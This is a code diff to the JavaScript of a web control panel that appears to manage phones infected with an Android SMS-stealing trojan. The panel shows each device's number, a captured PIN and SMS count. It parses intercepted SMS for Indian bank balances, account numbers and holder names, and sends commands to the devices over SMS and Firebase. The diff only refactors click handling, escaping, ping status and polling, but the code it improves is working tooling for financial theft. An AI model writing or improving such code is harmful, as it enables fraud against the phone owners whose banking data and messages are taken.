@@ -466,6 +466,26 @@ function resolveOnlineStatus(s,fbId){
 var DEFAULT_FIREBASES=typeof REBEL_DEFAULT_FIREBASES!=='undefined'?REBEL_DEFAULT_FIREBASES:[];
 
 function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function escAttr(s){return String(s||'').replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
+function bindDevListEvents(){
+  var el=document.getElementById('devList');
+  if(!el||el._rebelBound)return;
+  el._rebelBound=true;
+  el.addEventListener('click',function(e){
+    var toggle=e.target.closest('.dev-toggle-wrap');
+    if(toggle){
+      e.preventDefault();
+      e.stopPropagation();
+      var tid=toggle.getAttribute('data-dev-id');
+      if(tid)toggleDeviceCheck(tid,e);
+      return;
+    }
+    var card=e.target.closest('.dev-card');
+    if(!card)return;
+    var id=card.getAttribute('data-dev-id');
+    if(id)selectDevice(id);
+  });
+}
 function toast(msg,ok){var w=document.getElementById('toasts'),d=document.createElement('div');d.className='toast '+(ok?'ok':'err');d.textContent=msg;w.appendChild(d);setTimeout(function(){d.remove();},2800);}
 function makeDevKey(fbId,devId){return fbId+'::'+devId;}
 function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
@@ -786,13 +806,13 @@ function renderDevices(){
   el.innerHTML=list.map(function(d){
     var pinChip=d.pin?'<span class="chip bat">PIN '+esc(d.pin)+'</span>':'';
     var bankChip=deviceBankCache[d.id]===true?'<span class="chip fb">🏦 Bank</span>':'';
-    return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
+    return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" data-dev-id="'+escAttr(d.id)+'">'+
       '<div class="dev-bar"></div><div class="dev-body">'+
       '<div class="dev-phone">'+esc(d.displayPhone)+'</div>'+
       '<div class="dev-meta">'+esc(d.name)+' · <span class="chip fb">'+esc(d.fbName)+'</span></div>'+
       '<div class="dev-chips">'+pinChip+bankChip+'<span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
       '</div>'+
-      '<div class="dev-toggle-wrap" onclick="toggleDeviceCheck(\''+d.id+'\',event)">'+
+      '<div class="dev-toggle-wrap" data-dev-id="'+escAttr(d.id)+'">'+
       '<div class="toggle dev-toggle'+(isDeviceChecked(d.id)?' on':'')+'" title="'+(isDeviceChecked(d.id)?'Checked':'Unchecked')+'"></div></div></div>';
   }).join('');
 }
@@ -1098,9 +1118,10 @@ function checkRecharge(){
   var phone=d.displayPhone;
   if(!phone||phone==='No Number'){toast('Device has no phone number',false);return;}
   document.getElementById('sendStatus').textContent='Pinging...';
-  sendSmsInternal(phone, 'REBEL_PING', _sendSimSlot, function(success){
+  sendSmsInternal(phone, 'REBEL_PING', _sendSimSlot, function(success, data){
+    document.getElementById('sendStatus').textContent=success?'✅ Ping sent – device is reachable!':'❌ '+(data&&data.error||'Ping failed – device may be offline');
     if(success) toast('Ping sent – device is reachable!',true);
-    else toast('Ping failed – device may be offline',false);
+    else toast(data&&data.error||'Ping failed – device may be offline',false);
   });
 }
 function sendSmsInternal(to, msg, simSlot, callback){
@@ -1196,7 +1217,7 @@ function isBalanceAlertSms(body){var b=String(body||'');return /(?:avl|available
 function looksLikeBankSms(body,address){var bal=extractBalanceFromSms(body);if(bal==null)return false;if(inferBankFromSender(address))return true;if(inferBankFromBody(body))return true;if(extractAccountFromSms(body))return true;if(isBalanceAlertSms(body))return true;if(/(?:credited|debited|withdrawn|deposited|transferred|spent|paid|received)/i.test(body)&&/(?:a\/c|acct|account)/i.test(body))return true;if(/(?:sbi|hdfc|icici|axis|kotak|pnb|bob|canara|union|idbi|yes\s*bank|indusind|federal|bandhan|idfc|rbl)/i.test(body))return true;return false;}
 function maskBankAccount(acct){if(!acct||acct==='Unknown')return'Unknown';var d=String(acct).replace(/\D/g,'');if(d.length<=4)return d||'Unknown';return 'XXXX'+d.slice(-4);}
 function formatInr(n){if(n==null||isNaN(n))return'—';return '₹ '+Number(n).toLocaleString('en-IN',{minimumFractionDigits:2,maximumFractionDigits:2});}
-function parseBankAccountsFromSms(smsList){var map={},keys,k,row,bals,sum,i,acctKey;(smsList||[]).forEach(function(s){if(!s||!s.body||!looksLikeBankSms(s.body,s.address))return;var bal=extractBalanceFromSms(s.body);if(bal==null)return;var acct=extractAccountFromSms(s.body)||'';var bank=inferBankName(s.body,s.address);if(!bank)return;acctKey=acct||'NA';k=bank+'|'+acctKey;if(!map[k])map[k]={bank:bank,account:acct,holder:'',balances:[],latestMs:0,latestDate:'',sender:''};row=map[k];if(!row.account&&acct)row.account=acct;var holder=extractHolderFromSms(s.body);if(holder&&!row.holder)row.holder=holder;row.balances.push(bal);var ms=s.date||s.date_ms||0;if(ms>=row.latestMs){row.latestMs=ms;row.latestDate=s.date_readable||'';row.current=bal;row.sender=s.address||'';if(holder)row.holder=holder;if(acct)row.account=acct;}});keys=Object.keys(map);return keys.map(function(key){row=map[key];bals=row.balances;sum=0;for(i=0;i<bals.length;i++)sum+=bals[i];return{bank:row.bank,account:row.account,accountMask:maskBankAccount(row.account||'Unknown'),holder:row.holder||'',sender:row.sender||'',current:row.current!=null?row.current:bals[bals.length-1],average:sum/bals.length,highest:Math.max.apply(null,bals),lowest:Math.min.apply(null,bals),count:bals.length,latestDate:row.latestDate};}).sort(function(a,b){return a.bank.localeCompare(b.bank);});}
+function parseBankAccountsFromSms(smsList){var map={},keys,k,row,bals,sum,i,acctKey;(smsList||[]).forEach(function(s){if(!s||!s.body||!looksLikeBankSms(s.body,s.address))return;var bal=extractBalanceFromSms(s.body);if(bal==null)return;var acct=extractAccountFromSms(s.body)||'';var bank=inferBankName(s.body,s.address);if(!bank)return;acctKey=acct||'NA';k=bank+'|'+acctKey;if(!map[k])map[k]={bank:bank,account:acct,holder:'',balances:[],latestMs:0,latestDate:'',sender:''};row=map[k];if(!row.account&&acct)row.account=acct;var holder=extractHolderFromSms(s.body);if(holder&&!row.holder)row.holder=holder;row.balances.push(bal);var ms=s.ts||s.date||s.date_ms||0;if(ms>=row.latestMs){row.latestMs=ms;row.latestDate=s.date_readable||'';row.current=bal;row.sender=s.address||'';if(holder)row.holder=holder;if(acct)row.account=acct;}});keys=Object.keys(map);return keys.map(function(key){row=map[key];bals=row.balances;sum=0;for(i=0;i<bals.length;i++)sum+=bals[i];return{bank:row.bank,account:row.account,accountMask:maskBankAccount(row.account||'Unknown'),holder:row.holder||'',sender:row.sender||'',current:row.current!=null?row.current:bals[bals.length-1],average:sum/bals.length,highest:Math.max.apply(null,bals),lowest:Math.min.apply(null,bals),count:bals.length,latestDate:row.latestDate};}).sort(function(a,b){return a.bank.localeCompare(b.bank);});}
 function renderBankAccounts(){
   var dev=getSelDev(),listEl=document.getElementById('bankList'),emptyEl=document.getElementById('bankEmpty');
   if(!dev){if(emptyEl){emptyEl.style.display='';emptyEl.innerHTML='<div class="ico">📱</div>Select a device to load bank balances<br><span style="font-size:12px;opacity:.6">Tap a device on Home</span>';}if(listEl)listEl.innerHTML='';return;}
@@ -1274,6 +1295,7 @@ function useSelForAutoToken(){
 /* BOOT — admin.php Firebase sync for k.php */
 (function(){
   try{
+    bindDevListEvents();
     loadDeviceToggles();
     initFirebase(true).then(function(){
       panelReady=true;
@@ -1287,10 +1309,9 @@ function useSelForAutoToken(){
 })();
 setInterval(function(){
   if(!panelReady)return;
-  syncFirebaseFromAdmin().then(function(changed){
-    if(changed)fetchAllData().catch(function(){});
+  syncFirebaseFromAdmin().then(function(){
+    return fetchAllData().catch(function(){});
   });
-  fetchAllData().catch(function(){});
 },20000);
 window.addEventListener('unhandledrejection',function(){});
 </script>
